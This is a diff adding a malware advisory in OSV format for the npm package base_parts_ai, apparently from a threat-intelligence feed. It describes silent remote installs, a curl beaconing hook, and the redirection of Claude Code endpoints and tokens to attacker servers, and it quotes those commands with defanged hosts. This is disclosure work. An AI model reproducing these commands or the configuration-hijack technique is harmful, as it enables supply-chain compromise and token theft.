@@ -1,0 +1,75 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-14346",
+  "aliases": [
+    "MAL-2026-6228"
+  ],
+  "modified": "2026-11-20T01:38:17Z",
+  "published": "2026-11-20T01:37:00Z",
+  "summary": "Malicious code in base_parts_ai (npm)",
+  "details": "Base_parts_ai is a CLI wrapper around AI coding assistants (Claude Code, Codex, Grok, Gemini/Antigravity) that installs a server-controlled update channel and rewrites AI assistant configuration. Silent remote code install: on any invocation (lib/claude_cli_common.js calls it before any user action), lib/ai_utils.js fetchConfig() requests hxxps://jai[.]jaskle[.]cn/hm/hm_pub/ai_cc_cfg?r=\u003crandom\u003e. If the JSON response carries a higher version string, the package runs `npm install -g hxxps://jdwfiles[.]oss-cn-hangzhou[.]aliyuncs[.]com/npm_pkg/base_parts_ai-\u003cversion\u003e.tgz --force --registry=hxxps://registry[.]npmmirror[.]com` and re-executes itself. The confirmation prompt is commented out and the answer is hardcoded to \"yes\", so a tarball hosted outside the npm registry and named by the remote response is installed globally and run without consent. AI assistant configuration hijack: lib/setapi_cc.js writes the server-supplied channel envObj (ANTHROPIC_BASE_URL, ANTHROPIC_AUTH_TOKEN) into ~/.claude/settings.json, redirecting the user's Claude Code endpoint and token to an operator-chosen value, and sets autoUpdaterStatus='disabled' and hasCompletedOnboarding=true in ~/.claude.json. lib/ai_utils.js also installs a persistent SessionStart hook in ~/.claude/settings.json that executes `curl -s -m 5 hxxps://jai[.]jaskle[.]cn/hm/pub/ai_tip?cli=cc-\u003cplatform\u003e_\u003carch\u003e`, beaconing platform/architecture on every future Claude Code session. Credential-adjacent access: lib/ucx.js reads ~/.codex/auth.json, extracts OPENAI_API_KEY and base64url-decodes JWT id_token/access_token to recover the account email, and swaps config.toml, auth.json,.env and models.json between ~/.codex and ~/.codex_* account directories. No outbound transmission of those values was found in this version. Other behaviour: lib/wagy.js spawns %LOCALAPPDATA%\\Programs\\antigravity\\Antigravity.exe detached; lib/jagy.js runs `curl -fsSL hxxps://antigravity[.]google/cli/install.sh | bash` when the user invokes that command; the jgrok/jcodex/jclaude commands run `npm install -g @xai-official/grok`, `@openai/codex` and `@anthropic-ai/claude-code` from the hxxps://mirrors[.]cloud[.]tencent[.]com/npm/ registry mirror. Indicators: hxxps://jai[.]jaskle[.]cn/hm/hm_pub/ai_cc_cfg, hxxps://jai[.]jaskle[.]cn/hm/pub/ai_tip, hxxps://jdwfiles[.]oss-cn-hangzhou[.]aliyuncs[.]com/npm_pkg/base_parts_ai-\u003cversion\u003e.tgz, hxxps://mirrors[.]cloud[.]tencent[.]com/npm/.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "base_parts_ai",
+        "purl": "pkg:npm/base_parts_ai"
+      },
+      "versions": [
+        "1.0.66"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/base_parts_ai/v/1.0.66"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-14346"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-11-20T01:37:00Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "jai[.]jaskle[.]cn",
+          "jdwfiles[.]oss-cn-hangzhou[.]aliyuncs[.]com",
+          "mirrors[.]cloud[.]tencent[.]com",
+          "registry[.]npmmirror[.]com"
+        ],
+        "sha256": [
+          "72af50f0efe732b7668d3f9ad941485ed1b1f3ed95fd4c15b727596b100e39fa"
+        ],
+        "url_observed": [
+          "hxxps://antigravity[.]google/cli/install[.]sh",
+          "hxxps://jai[.]jaskle[.]cn/hm/hm_pub/ai_cc_cfg",
+          "hxxps://jai[.]jaskle[.]cn/hm/pub/ai_tip",
+          "hxxps://jdwfiles[.]oss-cn-hangzhou[.]aliyuncs[.]com/npm_pkg/base_parts_ai-",
+          "hxxps://mirrors[.]cloud[.]tencent[.]com/npm/",
+          "hxxps://registry[.]npmmirror[.]com"
+        ]
+      }
+    }
+  }
+}
